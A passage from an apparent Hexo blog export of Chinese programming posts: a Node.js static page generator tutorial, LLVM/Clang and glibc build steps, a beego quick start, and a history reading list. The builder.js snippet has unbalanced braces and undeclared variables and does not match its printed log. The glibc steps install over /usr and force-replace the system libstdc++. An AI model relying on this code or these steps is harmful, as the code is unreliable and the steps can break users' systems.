<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;Index&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;stylesheets&quot;</span>: [<span class="string">&quot;./css/style.css&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: [<span class="string">&quot;./js/main.js&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;charset&quot;</span>: <span class="string">&quot;utf-8&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;This is a page&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span>: <span class="string">&quot;page, sample&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;None&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;favicon&quot;</span>: <span class="string">&quot;./images/favicon.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;viewport&quot;</span>: <span class="string">&quot;width=device-width, initial-scale=1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extra&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Step-3-编写模板和构建脚本（template-amp-build-Script）"><a href="#Step-3-编写模板和构建脚本（template-amp-build-Script）" class="headerlink" title="Step 3: 编写模板和构建脚本（template &amp; build Script）"></a>Step 3: 编写模板和构建脚本（template &amp; build Script）</h4><p>代码生成器中需要定制开发的部分包括 <strong>builder.js</strong> 和 <strong>pages_template.js</strong>。build.js 相当于 main 函数，控制入口和流程，加载资源数据、调用 generator 任务，与 Makefile 和 Ant.xml 非常类似。pages_template.js 依赖的组件是 <a href="https://markdown-it.github.io/markdown-it/#MarkdownIt.configure">markdown-it</a> ，负责将 Markdown 源文件转换输出成 HTML 文件。builder.js 将 pages_template.js 视为一个模块引用：<strong>pageTemplate.generatePage(pageContent, metaData))</strong> 因此可以根据需要定制多个不同的 XXX_template.js 或者在每个 template.js 中定义其它函数。</p>
<p><strong>builder.js</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pageTemplate = <span class="built_in">require</span>(<span class="string">&#x27;./page_template&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All paths are relative to package.json.</span></span><br><span class="line"><span class="keyword">var</span> pagesPath = <span class="string">&#x27;./pages&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> pagesMetaPath = <span class="string">&#x27;./pages_meta&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> copyFolders = [<span class="string">&#x27;./images&#x27;</span>, <span class="string">&#x27;./css&#x27;</span>, <span class="string">&#x27;./js&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> outputPath = <span class="string">&#x27;./build&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clean</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Cleaning previous build...&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> file <span class="keyword">of</span> fs.readdirSync(outputPath))&#123;</span><br><span class="line">    fs.removeSync(path.join(outputPath, file));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Loading</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Loading pages metadata...&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> pageMeta <span class="keyword">of</span> fs.readdirSync(pagesMetaPath))&#123;</span><br><span class="line">    pagesMeta[pageMeta] = fs.readFileSync(path.join(pagesMetaPath,pageMeta),<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Generating pages...&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> page <span class="keyword">of</span> <span class="built_in">Object</span>.entries(pages)) &#123;</span><br><span class="line">    <span class="keyword">var</span> pageName = page[<span class="number">0</span>].slice(<span class="number">0</span>, page[<span class="number">0</span>].lastIndexOf(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">    <span class="keyword">var</span> metaData = pagesMeta.hasOwnProperty(pageName+<span class="string">&#x27;.json&#x27;</span>)</span><br><span class="line">      ? <span class="built_in">JSON</span>.parse(pagesMeta[pageName+<span class="string">&#x27;.json&#x27;</span>])</span><br><span class="line">      : &#123;&#125;;</span><br><span class="line">    metaData.title = metaData.title || pageName;</span><br><span class="line">    <span class="keyword">var</span> pageContent = page[<span class="number">1</span>];</span><br><span class="line">    fs.writeFileSync(</span><br><span class="line">      path.join(outputPath,pageName+<span class="string">&#x27;.html&#x27;</span>),</span><br><span class="line">      pageTemplate.generatePage(pageContent, metaData));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Copying folders...&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> copyFolder <span class="keyword">of</span> copyFolders)&#123;</span><br><span class="line">    fs.copySync(copyFolder, path.join(outputPath,copyFolder));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>pages_template.js</strong><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> md = <span class="built_in">require</span>(<span class="string">&#x27;markdown-it&#x27;</span>)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">generatePage</span>: <span class="function"><span class="keyword">function</span>(<span class="params">pageContent,pageMeta</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span><span class="string">`&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;<span class="subst">$&#123;pageMeta.lang || <span class="built_in">this</span>.defaultMeta.lang&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;<span class="subst">$&#123;pageMeta.title || <span class="built_in">this</span>.defaultMeta.title&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;<span class="subst">$&#123;pageMeta.charset || <span class="built_in">this</span>.defaultMeta.charset&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;description&quot; content=&quot;<span class="subst">$&#123;pageMeta.description || <span class="built_in">this</span>.defaultMeta.description&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;keywords&quot; content=&quot;<span class="subst">$&#123;pageMeta.keywords || <span class="built_in">this</span>.defaultMeta.keywords&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;author&quot; content=&quot;<span class="subst">$&#123;pageMeta.author || <span class="built_in">this</span>.defaultMeta.author&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;md.render(pageContent)&#125;</span></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="Step-4-优化任务脚本"><a href="#Step-4-优化任务脚本" class="headerlink" title="Step 4: 优化任务脚本"></a>Step 4: 优化任务脚本</h4><p>在 Step 1 步骤中，npm init 创建了一个文件：<strong>package.json</strong>，我们可以定义其中的 “scripts” , 执行 <strong>npm run start</strong> 将默认在 1080 端口开启 Web 服务。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language-Auto-Generator-HTML.png" alt=""></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;coffee&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;beyond my coffee&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;  </span><br><span class="line">    <span class="attr">&quot;build-pages&quot;</span>: <span class="string">&quot;node ./build_scripts/builder.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;concurrently --kill-others \&quot;nodemon -e js,json,css,md -i build -x \\\&quot;npm run build-pages\\\&quot;\&quot; \&quot;live-server ./build\&quot;&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;@RiboseYim&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ npm run build-pages</span><br><span class="line"></span><br><span class="line">&gt; coffee@<span class="number">1.0</span><span class="number">.0</span> build-pages /generator-code</span><br><span class="line">&gt; node ./build_scripts/builder.js</span><br><span class="line"></span><br><span class="line">Cleaning previous build...</span><br><span class="line">Loading pages...</span><br><span class="line">Loading pages metadata...</span><br><span class="line">Generating pages...</span><br><span class="line">Copying folders...</span><br><span class="line">Done!</span><br><span class="line"></span><br><span class="line">$ npm run start</span><br><span class="line"></span><br><span class="line">&gt; coffee@<span class="number">1.0</span><span class="number">.0</span> start /Users/yanrui/project/generator-code</span><br><span class="line">&gt; concurrently --kill-others <span class="string">&quot;nodemon -e js,json,css,md -i build -x \&quot;npm run build-pages\&quot;&quot;</span> <span class="string">&quot;live-server ./build&quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>] [nodemon] <span class="number">1.14</span><span class="number">.1</span></span><br><span class="line">[<span class="number">0</span>] [nodemon] to restart at any time, enter <span class="string">`rs`</span></span><br><span class="line">[<span class="number">0</span>] [nodemon] watching: *.*</span><br><span class="line">[<span class="number">0</span>] [nodemon] starting <span class="string">`npm run build-pages`</span></span><br><span class="line">[<span class="number">1</span>] Serving <span class="string">&quot;./build&quot;</span> at http:<span class="comment">//127.0.0.1:8080</span></span><br><span class="line">[<span class="number">1</span>] Ready <span class="keyword">for</span> changes</span><br><span class="line">[<span class="number">1</span>] GET /js/main.js <span class="number">404</span> <span class="number">42.133</span> ms - <span class="number">23</span></span><br><span class="line">[<span class="number">1</span>] GET /js/main.js <span class="number">404</span> <span class="number">12.204</span> ms - <span class="number">23</span></span><br><span class="line">[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>] &gt; coffee@<span class="number">1.0</span><span class="number">.0</span> build-pages /Users/yanrui/project/generator-code</span><br><span class="line">[<span class="number">0</span>] &gt; node ./build_scripts/builder.js</span><br><span class="line">[<span class="number">0</span>]</span><br><span class="line">[<span class="number">0</span>] Cleaning previous build...</span><br><span class="line">[<span class="number">0</span>] Loading pages...</span><br><span class="line">[<span class="number">0</span>] Loading pages metadata...</span><br><span class="line">[<span class="number">0</span>] Generating pages...</span><br><span class="line">[<span class="number">0</span>] Copying folders...</span><br><span class="line">[<span class="number">0</span>] Done!</span><br><span class="line">[<span class="number">0</span>] [nodemon] clean exit - waiting <span class="keyword">for</span> changes before restart</span><br><span class="line">[<span class="number">1</span>] Change detected build/index.html</span><br><span class="line">[<span class="number">1</span>] Change detected build/images</span><br></pre></td></tr></table></figure>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><h4 id="Hexo-Startup"><a href="#Hexo-Startup" class="headerlink" title="Hexo Startup"></a>Hexo Startup</h4><h4 id="Hexo-Theme"><a href="#Hexo-Theme" class="headerlink" title="Hexo Theme"></a>Hexo Theme</h4><ul>
<li>Hexo Theme <a href="https://github.com/giscafer/hexo-theme-cafe">Cafe</a></li>
</ul>
<h4 id="Hexo-Questions"><a href="#Hexo-Questions" class="headerlink" title="Hexo Questions"></a>Hexo Questions</h4><ul>
<li>Hexo g 失败【Uncaught SyntaxError: Invalid or unexpected token】：临时办法-复制到Editplus查看乱码</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://hackernoon.com/building-a-simple-static-page-generator-with-node-js-4f58f680c47d">Building a simple static page generator with Node.js</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言：C 语言</title>
    <url>/2019/01/07/Language-C-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<blockquote>
<p>如果你想进入真正的编程领域，则必须学习 <strong>C</strong>，这是 UNIX 的核心语言。C++ 和 C 的关系很密切；如果你懂其中一个，学另一个并不会太难。不过，这两种语言都不是好的入门语言。 其他对黑客而言比较重要的语言有 <strong><a href="http://www.perl.com" target="_blank" rel="noopener">Perl</a></strong> 和 <strong>LISP</strong>。—— 《大教堂与集市》</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>玩转编程语言:编译原理</title>
    <url>/2017/05/12/Language-Compiler/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>LLVM（Low Level Virtual Machine）</li>
<li>构建 LLVM 和 Clang 开发工具库</li>
</ul>
<a id="more"></a>
<h4 id="A-Go-compiler-and-runtime"><a href="#A-Go-compiler-and-runtime" class="headerlink" title="A Go compiler and runtime"></a>A Go compiler and runtime</h4><p>The language spec is a text document, which is not useful in and of itself. For that you need software that actually implements these semantics. This is done by a compiler (which analyzes and checks the source code and transforms it into an executable format) and a runtime (which provides the necessary environment to actually run the code). There are many such combinations and they all differ a bit more or a bit less. Examples are</p>
<ul>
<li><p>gc, a compiler and runtime written in pure Go (with some assembly) by the Go team themselves and versioned and released together with the language. Unlike other such tools, gc doesn’t strictly separate the compiler, assembler and linker - they end up sharing a lot of code and some of the classical responsibilities move or are shared between them. As such, it’s in general not possible to e.g. link packages compiled by different versions of gc.</p>
</li>
<li><p>gccgo and libgo, a frontend for gcc and a runtime. It’s written in C and maintained by the Go team. It lives in the gcc organization though and is released according to the gcc release schedule and thus often lags a bit behind the “latest” version of the Go spec.</p>
</li>
<li><p>llgo, a frontend for LLVM. I don’t know much else about it.<br>gopherjs, compiling Go code into javascript and using a javascript VM plus some custom code as a runtime. Long-term, it’ll probably be made obsolete by gc gaining native support for WebAssembly.</p>
</li>
<li><p>tinygo, an incomplete implementation targeting small code size. Runs on either bare-metal micro-controllers or WebAssembly VMs, with a custom runtime. Due to its limitations it doesn’t technically implement Go - notably, it doesn’t include a garbage collector, concurrency or reflection.</p>
</li>
</ul>
<h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>LLVM（Low Level Virtual Machine）是一种编译器基础设施，以 C++ 写成。起源于 2000 年伊利诺伊大学厄巴纳-香槟分校维克拉姆·艾夫（Vikram Adve）与克里斯·拉特纳（Chris Lattner）的研究，他们想要为所有静态及动态语言创造出动态的编译技术。2005 年，Apple 直接雇用了克里斯·拉特纳及他的团队，为了苹果电脑开发应用程序，期间克里斯·拉特纳设计发明了 Swift 语言，LLVM 成为 Mac OS X 及 iOS 开发工具的一部分。LLVM 的范围早已经不局限于创建一个虚拟机，成为了众多编译工具及低级工具技术的统称，适用于 LLVM 下的所有项目，包含 LLVM 中介码（LLVM IR）、LLVM 除错工具、LLVM C++ 标准库等。</p>
<p>目前 LLVM 已支持包括 ActionScript、Ada、D 语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Rust、Scala1 以及 C# 等语言。</p>
<h4 id="LLVM-与-Clang"><a href="#LLVM-与-Clang" class="headerlink" title="LLVM 与 Clang"></a>LLVM 与 Clang</h4><p>Clang 是LLVM编译器工具集的前端（front-end），目的是输出代码对应的抽象语法树（Abstract Syntax Tree, AST），并将代码编译成LLVM Bitcode。接着在后端（back-end）使用 LLVM 编译成平台相关的机器语言 。Clang支持C、C++、Objective C。它的目标是提供一个 GCC 的替代品。作者是克里斯·拉特纳（Chris Lattner），在苹果公司的赞助支持下进行开发。Clang项目包括Clang前端和Clang静态分析器等。</p>
<h4 id="构建-LLVM-和-Clang-开发工具库"><a href="#构建-LLVM-和-Clang-开发工具库" class="headerlink" title="构建 LLVM 和 Clang 开发工具库"></a>构建 LLVM 和 Clang 开发工具库</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MacOS</span></span><br><span class="line">$ brew install --with-toolchain llvm</span><br><span class="line">$ brew info llvm</span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">$ yum install gcc</span><br><span class="line">$ yum install gcc-g++</span><br><span class="line"></span><br><span class="line">wget https://cmake.org/files/v3.9/cmake-3.9.0-rc4.tar.gz</span><br><span class="line">tar -xvf cmake-3.9.0-rc4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> cmake-3.9.0</span><br><span class="line">./bootstrap  </span><br><span class="line">gmake</span><br><span class="line">gmake install</span><br><span class="line"><span class="built_in">export</span> CMAKE_ROOT=/usr/<span class="built_in">local</span>/share/cmake-3.9.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$CMAKE_ROOT</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> http://llvm.org/git/llvm.git</span><br><span class="line"><span class="built_in">cd</span> llvm/tools;</span><br><span class="line">git <span class="built_in">clone</span> http://llvm.org/git/clang.git</span><br><span class="line"><span class="built_in">cd</span> ..; mkdir -p build/install; <span class="built_in">cd</span> build</span><br><span class="line">cmake -G <span class="string">"Unix Makefiles"</span> -DLLVM_TARGETS_TO_BUILD=<span class="string">"BPF;X86"</span> -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=<span class="variable">$PWD</span>/install ..</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PWD</span>/install/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget  http://ftp.gnu.org/pub/gnu/glibc/glibc-2.17.tar.gz</span><br><span class="line">$ tar -zxvf glibc-2.17.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> glibc-2.17</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ ../configure</span><br><span class="line">    --prefix=/usr</span><br><span class="line">    --disable-profile</span><br><span class="line">    --enable-add-ons</span><br><span class="line">    --with-headers=/usr/include</span><br><span class="line">    --with-binutils=/usr/bin</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">$ strings /lib64/libc.so.6|grep GLIBC</span><br></pre></td></tr></table></figure>
<h4 id="glibc-1"><a href="#glibc-1" class="headerlink" title="glibc++"></a>glibc++</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ yum provides libstdc++.so.6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完成之后查看</span></span><br><span class="line">$ strings /usr/<span class="built_in">local</span>/lib64/libstdc++.so.6.0.20 | grep GLIBCXX_</span><br><span class="line"><span class="comment"># 发现有了相应的3.4.20支持</span></span><br><span class="line">$ ln -sf /usr/<span class="built_in">local</span>/lib64/libstdc++.so.6.0.20 /usr/lib64/libstdc++.so.6</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://blog.gopheracademy.com/advent-2018/llvm-ir-and-go/" target="_blank" rel="noopener">LLVM IR and Go</a><br><img src="https://blog.gopheracademy.com/postimages/advent-2018/llvm-ir-and-go/llvm_compiler_pipeline.png" alt></li>
</ul>
<h4 id="玩转编程语言系列"><a href="#玩转编程语言系列" class="headerlink" title="玩转编程语言系列"></a><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.merovius.de/2019/06/12/birdseye-go.html" target="_blank" rel="noopener">A bird’s eye view of Go</a></li>
<li><a href="http://www.cs.cornell.edu/~asampson/blog/llvm.html" target="_blank" rel="noopener">LLVM for Grad Students</a></li>
<li><a href="https://medium.com/dailyjs/gentle-introduction-into-compilers-part-1-lexical-analysis-and-scanner-733246be6738" target="_blank" rel="noopener">Gentle introduction into compilers. Part 1: Lexical analysis and Scanner | A guide to understanding ECMAScript (JavaScript) spec lexical grammar and TypeScript scanner</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:基于Golang开发Web应用</title>
    <url>/2018/04/27/Language-Go-lang-Web/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="beego"><a href="#beego" class="headerlink" title="beego"></a>beego</h2><h4 id="Beego-ABC"><a href="#Beego-ABC" class="headerlink" title="Beego ABC"></a>Beego ABC</h4><ul>
<li><p>lib</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/astaxie/beego</span><br><span class="line"><span class="keyword">go</span> get github.com/beego/admin/src/lib</span><br></pre></td></tr></table></figure>
</li>
<li><p>tools<br>bee 可执行文件默认路径 $GOPATH/bin</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/beego/bee  <span class="comment">//tools</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The commands are:</span><br><span class="line">    new         create an application base on beego framework</span><br><span class="line">    run         run the app <span class="built_in">which</span> can hot compile</span><br><span class="line">    pack        compress an beego project</span><br><span class="line">    api         create an api application base on beego framework</span><br><span class="line">    bale        packs non-Go files to Go <span class="built_in">source</span> files</span><br><span class="line">    version     show the bee &amp; beego version</span><br><span class="line">    generate    <span class="built_in">source</span> code generator</span><br><span class="line">    migrate     run database migrations</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-3.2$ bee new hello</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.9.1</span><br></pre></td></tr></table></figure>
<h4 id="Beego-Resources"><a href="#Beego-Resources" class="headerlink" title="Beego Resources"></a>Beego Resources</h4><ul>
<li><a href="https://beego.me/docs/intro/" target="_blank" rel="noopener">The architecture of Beego</a></li>
<li><a href="https://github.com/beego/tutorial/blob/master/README_zh.md" target="_blank" rel="noopener">beego入门教程</a></li>
<li><a href="https://github.com/beego/admin" target="_blank" rel="noopener">基于beego的后台管理系统</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.usejournal.com/top-6-web-frameworks-for-go-as-of-2017-23270e059c4b" target="_blank" rel="noopener">Top 6 web frameworks for Go as of 2017</a>.doc   </li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Overview of History</title>
    <url>/2016/05/01/History/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-to-History"><a href="#Introduction-to-History" class="headerlink" title="Introduction to History"></a>Introduction to History</h2><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li><a href="https://legacy.lib.utexas.edu/maps/historical/colbeck/world_1772.jpg" target="_blank" rel="noopener">世界地图|1772年|清乾隆三十七年</a></li>
<li><a href="https://legacy.lib.utexas.edu/maps/historical/asia_1808.jpg" target="_blank" rel="noopener">亚洲地图|1808年|清嘉庆十三年</a></li>
<li><a href="https://legacy.lib.utexas.edu/maps/historical/asia_1892_amer_ency_brit.jpg" target="_blank" rel="noopener">亚洲地图|1892年|清光绪十八年</a></li>
<li><a href="http://legacy.lib.utexas.edu/maps/historical/japan_world_map_1914.jpg" target="_blank" rel="noopener">世界地图|1914年|民国三年</a></li>
<li><p><a href="https://legacy.lib.utexas.edu/maps/historical/british_dominions_yearbook/countries_density_1918.jpg" target="_blank" rel="noopener">世界地图·人口|1918年|民国六年</a></p>
</li>
<li><p><a href="https://shuge.org/ebook/harrison-forman-collection/" target="_blank" rel="noopener">福尔曼的中国摄影集(1932至1973年)</a></p>
</li>
<li><a href="http://m.loadmap.net/en" target="_blank" rel="noopener">军用地图下载站</a></li>
</ul>
<h1 id="原创：《香山野史》"><a href="#原创：《香山野史》" class="headerlink" title="原创：《香山野史》"></a>原创：《香山野史》</h1><ol>
<li><a href="http://www.jianshu.com/p/a1c8a0486d55" target="_blank" rel="noopener">第一节：水客列传</a></li>
<li><a href="http://www.jianshu.com/p/3eb04ec90127" target="_blank" rel="noopener">第二节：病理解析群体暴力</a></li>
<li><a href="http://www.jianshu.com/p/220ce86a08ee" target="_blank" rel="noopener">第三节：武侠世界的三教九流</a></li>
</ol>
<h4 id="原创：《庆丰野史》"><a href="#原创：《庆丰野史》" class="headerlink" title="原创：《庆丰野史》"></a>原创：《庆丰野史》</h4><h1 id="读书笔记：世界史（一）"><a href="#读书笔记：世界史（一）" class="headerlink" title="读书笔记：世界史（一）"></a>读书笔记：世界史（一）</h1><h2 id="古罗马史"><a href="#古罗马史" class="headerlink" title="古罗马史"></a>古罗马史</h2><ol>
<li><a href="#">《罗马帝国主义》</a></li>
<li><a href="#">《罗马帝国衰亡史》</a></li>
</ol>
<h1 id="读书笔记：中国史（二）"><a href="#读书笔记：中国史（二）" class="headerlink" title="读书笔记：中国史（二）"></a>读书笔记：中国史（二）</h1><h2 id="一、现代史"><a href="#一、现代史" class="headerlink" title="一、现代史"></a>一、现代史</h2><ul>
<li><a href="http://www.sxsdq.cn/sqzlk/dqcs/dacswz/shaanxi/sxgadsj/201706/t20170616_910081.html" target="_blank" rel="noopener">《陕西省公安史志》</a></li>
</ul>
<h2 id="二、民国史"><a href="#二、民国史" class="headerlink" title="二、民国史"></a>二、民国史</h2><ul>
<li><a href="http://www.jianshu.com/p/c43df2f608bb" target="_blank" rel="noopener">《国士无双伍连德》（中国公共卫生先驱）</a></li>
</ul>
<h2 id="三、中共党史"><a href="#三、中共党史" class="headerlink" title="三、中共党史"></a>三、中共党史</h2><ul>
<li><a href="#">高华系列|《红太阳是怎样升起的》</a></li>
<li><a href="https://www.youtube.com/watch?v=8rsqTEDy_Q4" target="_blank" rel="noopener">高华系列|Youtube 再探林彪事件</a></li>
<li><a href="https://www.youtube.com/watch?v=1oNhQysdLhw&amp;t=4954s" target="_blank" rel="noopener">高华系列|Youtube 毛泽东何以发动文革</a></li>
<li><a href="https://www.youtube.com/watch?v=NKCE2CJ_5LY&amp;t=5719s" target="_blank" rel="noopener">高华系列|Youtube 谈谈抗战历史的几个问题</a></li>
<li><a href="https://www.youtube.com/watch?v=pCNiJToPtMM&amp;t=7783s" target="_blank" rel="noopener">高华系列|Youtube 有关红军长征研究的若干问题</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/MrGuZhun/" target="_blank" rel="noopener">顾准</a></li>
<li><a href="https://www.marxists.org/chinese/maozedong/marxist.org-chinese-mao-192703.htm" target="_blank" rel="noopener">湖南农民运动考察报告|（一九二七年三月）|</a></li>
<li><a href="https://www.marxists.org/chinese/index.html" target="_blank" rel="noopener">中文马克思主义文库</a></li>
</ul>
<h2 id="四、清史"><a href="#四、清史" class="headerlink" title="四、清史"></a>四、<a href="https://riboseyim.github.io/2017/06/24/History-Qing/" target="_blank" rel="noopener">清史</a></h2><ul>
<li><a href="#">清史-雍正时期：《大义觉迷录》</a> (通阅,201705)</li>
<li><a href="#">清史-乾隆时期：《叫魂》</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">清史-嘉道咸时期：史景迁《太平天国》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">清史-嘉道咸时期：张集馨《时晴斋主人自叙年谱》</a></li>
